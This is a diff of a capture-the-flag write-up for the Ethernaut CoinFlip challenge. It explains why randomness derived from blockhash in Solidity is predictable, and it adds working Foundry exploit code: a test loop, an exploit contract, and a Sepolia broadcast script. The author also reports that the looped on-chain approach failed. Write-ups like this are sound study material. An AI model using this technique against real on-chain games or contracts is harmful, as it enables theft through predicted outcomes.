@@ -4,7 +4,7 @@
 <br>
   
 <p align="center">
-<img width="500" src=""">
+<img width="300" src=""">
 </p>
 
 
@@ -16,7 +16,7 @@
 <br>
 
 
-* in this challenge we exploit the determinism of a pseudo-random function compose of a global accessible variable, `blockhash`, and no added entropy.
+* in this challenge, we exploit the determinism of a pseudo-random function composed uniquely of an EVM global accessible variable (`blockhash`) and no added entropy.
 
 
 <br>
@@ -64,43 +64,64 @@ contract CoinFlip {
 <br>
 
 
-* the EVM is a deterministic Turing machine. since there is no inherent randomness on the EVM and as everything in the contracts are publicly visible (`block.timestamp` or `block.number`), generating random numbers in solidity is tricky  projects resource to external oracles or to Ethereum validator's **[RANDAO](https://github.com/randao/randao)** algorithm.
+* the EVM is a deterministic turing machine. 
+  - since it has no inherent randomness and as everything in the contracts is publicly visible (`block.timestamp`, `block.number`, etc.), generating random numbers in solidity is tricky. 
+  - projects resource to external oracles or to Ethereum validator's **[RANDAO](https://github.com/randao/randao)** algorithm.
 
 <br>
 
-* the `CoinFlip` contract uses the current `blockhash` to determine if the coin is head or tail, through the variable `coinFlip`:
-
-<br>
-
-```solidity
-    uint256 coinFlip = blockValue / FACTOR;
-    bool side = coinFlip == 1 ? true : false;
-```
-
-<br>
-
-* which is derived from the variable `blockValue`, a `uint156` generated from the previous block number (block's number minus 1):
+* the `CoinFlip` contract uses the current block's `blockhash` to determine the side of a coin, represented by a `bool` variable named `coinFlip`:
 
 <br>
 
 ```solidity
-    uint256 blockValue = uint256(blockhash(block.number - 1));
+uint256 coinFlip = blockValue / FACTOR;
+bool side = coinFlip == 1 ? true : false;
 ```
 
 <br>
 
-* this `FACTOR` variable is useless. first, it does not introduce any randomness entropy to `coinFlip` at all. Second, even if is private, we could just look at the contract at etherscan or decompile the bytecode (if the contract is not verified).
+* which is derived from the variable `blockValue` as a `uint156` generated from the previous block number (block's number minus 1):
 
 <br>
 
-* the "randomness" of this function is derived from on-chain deterministic data (global accessible variables such as `blockhash`, with no entropy), so to hack it we need to get `blockhash` before we submit a guess. we iterate by simulating the result, skipping the blocks when the result is not favorable.
+```solidity
+uint256 blockValue = uint256(blockhash(block.number - 1));
+```
 
 <br>
 
-* **[foundry's `vm.roll(uint256)`](https://book.getfoundry.sh/cheatcodes/roll?highlight=vm.roll#examples)simulate the `block.number` given by the `uint256`.
+* this `FACTOR` variable is useless. 
+  - first, division by a large constant does not introduce any randomness entropy at all. 
+  - second, even if this constant is private, it's still available at etherscan or by decompiling the bytecode (if the contract is not verified).
 
 <br>
 
+```solidity
+uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+```
+
+<br>
+
+* the "randomness" in this contract is calculated from on-chain deterministic data, so all we need to do is simulate `side` before we submit a guess, and repeat this ten times.
+
+<br>
+
+```solidity
+if (side == _guess) {
+  consecutiveWins++;
+return true;
+  } else {
+    consecutiveWins = 0;
+    return false;
+}
+```
+
+
+
+<br>
+
+* for this simulation, we leverage **[foundry's `vm.roll(uint256)`](https://book.getfoundry.sh/cheatcodes/roll?highlight=vm.roll#examples)**, which simulates the `block.number` given by the `uint256`.
 
 
 <br>
@@ -112,36 +133,138 @@ contract CoinFlip {
 
 <br>
 
-* check `test/03/Coinflip.t.sol`:
+* the general solution to this problem can see in the test file, `test/03/CoinFlip.t.sol`:
 
 <br>
 
 ```solidity
+import "forge-std/Test.sol";
+import {CoinFlip} from "src/03/CoinFlip.sol";
 
+contract CoinFlipTest is Test {
+
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    uint8 consecutiveWinsHacked = 10;
+
+    CoinFlip public level;
+    address instance = vm.addr(0x1); 
+    address hacker = vm.addr(0x2); 
+
+    function setUp() public {
+
+        vm.prank(instance);
+        level = new CoinFlip();
+    
+    }
+
+    /////////////////////////////////////////////////////
+    // Copy the pseudo-random function from the contract
+    ////////////////////////////////////////////////////
+    function generateSide() internal view returns (bool side) {
+
+            uint256 blockValue = uint256(blockhash(block.number - 1));
+            uint256 coinFlip = blockValue / FACTOR;
+            side = coinFlip == 1 ? true : false;
+
+     }
+
+    function testCoinFlipHack() public {
+
+        vm.startPrank(hacker);
+        assertEq(level.consecutiveWins(), 0);
+    
+        while (level.consecutiveWins() < consecutiveWinsHacked) {
+
+            /////////////////////
+            // "Flip" the coin
+            ////////////////////
+            level.flip(generateSide());
+
+            ////////////////////////////
+            // Simulate the next block
+            ////////////////////////////
+            vm.roll(block.number + 1);
+
+        }
+
+        assertEq(level.consecutiveWins(), consecutiveWinsHacked);
+        vm.stopPrank();
+
+      }
+}
 ```
 
 <br>
 
-* run:
+* which can be run with:
 
 <br>
 
 ```shell
 > forge test --match-contract CoinFlipTest -vvvv    
-
-
 ```
 
 
 
 <br>
 
-* submit with `script/03/CoinFlip.s.sol`:
+
+* because this time i wanted to run a loop in the deployment script, i removed the exploit logic from it and added it to its own contract inside `src/03/CoinFlipExploit.sol`:
 
 <br>
 
 ```solidity
+import {CoinFlip} from "src/03/CoinFlip.sol";
 
+contract CoinFlipExploit {
+
+    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    CoinFlip immutable level;
+
+    constructor(CoinFlip level_) {
+        level = level_;
+    }
+
+    function run() public returns (bool guess) {
+
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        bool side = blockValue / FACTOR == 1 ? true : false;
+        guess = level.flip(side);
+    
+    }
+}
+```
+
+<br>
+
+
+* which could be submitted with `script/03/CoinFlip.s.sol`:
+
+<br>
+
+```solidity
+import "forge-std/Script.sol";
+import {CoinFlip} from "src/03/CoinFlip.sol";
+import {CoinFlipExploit} from "src/03/CoinFlipExploit.sol";
+
+
+contract Exploit is Script {
+
+    uint256 private GUESSES = 10;
+    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    address levelInstance = 0xfC3A1c7Aaf80dAf711256cEa4d959722DbF2B5B1;
+    CoinFlip level = CoinFlip(levelInstance);
+    CoinFlipExploit exploit = new CoinFlipExploit(level);
+ 
+    function run() public {
+
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+        exploit.run();
+        vm.stopBroadcast();
+
+    }
+}
 ```
 
 <br>
@@ -152,9 +275,50 @@ contract CoinFlip {
 
 ```shell
 > forge script ./script/03/CoinFlip.s.sol --broadcast -vvvv --rpc-url sepolia
-
-
 ```
+
+
+<br>
+
+* initially i wanted to have `exploit.run();` in a loop like this:
+
+<br>
+
+
+```solidity
+uint256 count = 0;
+do {
+    exploit.run();
+    ++count;
+} while (count < GUESSES);
+```
+
+<br>
+
+* however this never worked, and i suspected it's because of a last bit in this contract, the `lastHash` check. 
+  - i originally thought it would require each new guess submission to occur after 12 seconds (the time it that takes for a new block to be minted in proof-of-stake):
+
+
+<br>
+
+```solidity
+if (lastHash == blockValue) {
+  revert();
+}
+
+lastHash = blockValue;
+```
+
+
+<br>
+
+* but that didn't even matter because either by manually running ten times (`while sleep 13; do forge script ./script/03/CoinFlip.s.sol --broadcast -vvvv --rpc-url sepolia; done`), this solution never really worked (even though i spent a few hours trying to find the bug). 
+  - this was a bit frustrating because this solution was foundry native and symmetric with the previous problems.
+  - i decided i had to try a new approach... using an `interface`.
+
+
+<br>
+
 
 <br>
 
